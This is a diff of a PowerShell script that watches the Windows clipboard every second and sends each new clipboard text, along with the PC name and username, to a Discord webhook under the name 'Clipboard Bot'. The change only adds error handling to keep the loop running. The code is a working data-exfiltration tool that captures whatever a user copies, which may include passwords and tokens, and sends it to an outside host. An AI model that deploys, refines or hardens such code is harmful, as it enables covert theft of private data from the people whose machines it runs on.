@@ -49,10 +49,11 @@ $lastClipboard = $null
 Write-Host "Monitoring clipboard. Press Ctrl+C to stop."
 
 while ($true) {
-    $clipboard = Get-Clipboard -Raw -ErrorAction SilentlyContinue
+    try {
+        $clipboard = Get-Clipboard -Raw -ErrorAction SilentlyContinue
 
-    if ($clipboard -and $clipboard -ne $lastClipboard) {
-        $message = @"
+        if ($clipboard -and $clipboard -ne $lastClipboard) {
+            $message = @"
 ------
 **PC Name:** $pcName
 **Username:** $fullUser
@@ -64,23 +65,25 @@ while ($true) {
 **Clipboard Message:** $clipboard
 "@
 
-        $payload = @{
-            content  = $message
-            username = "Clipboard Bot"
-        }
+            $payload = @{
+                content  = $message
+                username = "Clipboard Bot"
+            }
 
-        $payloadJson = $payload | ConvertTo-Json
+            $payloadJson = $payload | ConvertTo-Json
 
-        try {
-            Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payloadJson -ContentType 'application/json'
-            Write-Host "Sent updated clipboard at $(Get-Date)."
-            $lastClipboard = $clipboard
-        } catch {
-            Write-Warning "Failed to send to Discord: $_"
+            try {
+                Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payloadJson -ContentType 'application/json'
+                Write-Host "Sent updated clipboard at $(Get-Date)."
+                $lastClipboard = $clipboard
+            } catch {
+                Write-Warning "Failed to send to Discord: $_"
+            }
         }
+    } catch {
+        # Swallow any unexpected error from Get-Clipboard, here-string, etc.
+        Write-Warning "Loop error: $_"
     }
 
     Start-Sleep -Seconds 1
 }
-
-
